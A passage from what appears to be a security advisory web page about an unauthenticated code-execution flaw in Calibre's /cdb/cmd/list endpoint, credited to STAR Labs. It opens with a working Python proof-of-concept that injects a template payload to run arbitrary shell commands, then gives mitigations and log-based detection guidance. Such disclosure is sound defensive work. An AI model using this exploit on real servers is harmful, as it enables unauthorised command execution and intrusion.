</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">_target</span><span class="si">}</span><span class="s2">/cdb/cmd/list&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/json&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="n">json</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="s2">&#34;template&#34;</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="c1"># sortby: leave empty</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="c1"># ascending: leave empty</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="c1"># search_text: leave empty, set to all</span>
</span></span><span class="line"><span class="cl">            <span class="mi">1</span><span class="p">,</span> <span class="c1"># limit results</span>
</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;python:def evaluate(a, b):</span><span class="se">\n</span><span class="s2"> import subprocess</span><span class="se">\n</span><span class="s2"> try:</span><span class="se">\n</span><span class="s2"> return subprocess.check_output([&#39;cmd.exe&#39;, &#39;/c&#39;, &#39;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&#39;]).decode()</span><span class="se">\n</span><span class="s2"> except Exception:</span><span class="se">\n</span><span class="s2"> return subprocess.check_output([&#39;sh&#39;, &#39;-c&#39;, &#39;</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">&#39;]).decode()&#34;</span><span class="p">,</span> <span class="c1"># payload</span>
</span></span><span class="line"><span class="cl">        <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;result&#34;</span><span class="p">][</span><span class="s2">&#34;data&#34;</span><span class="p">][</span><span class="s2">&#34;template&#34;</span><span class="p">]</span><span class="o">.</span><span class="n">values</span><span class="p">())[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">exploit</span><span class="p">(</span><span class="s2">&#34;whoami&#34;</span><span class="p">)</span>
</span></span></code></pre></div><h2 id="suggested-mitigations">Suggested Mitigations<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
<p>Ensure that access controls on publicly accessible endpoints are properly implemented. If code execution is allowed by design, the server should not be exposed publicly, or it should be heavily restricted to highly privileged users only.</p>
<h2 id="detection-guidance">Detection Guidance<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
<p>It is possible to detect potential exploitation of the vulnerability by checking the server&rsquo;s access logs for repeated POST requests to the <code>/cdb/cmd/list</code> endpoint.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Amos Ng (<a href="https://twitter.com/lflarey">@LFlare</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/24/24-6781/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2024-6781) Calibre Arbitrary File Read</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/24/24-7008/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2024-7008) Calibre Reflected Cross-Site Scripting (XSS)</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
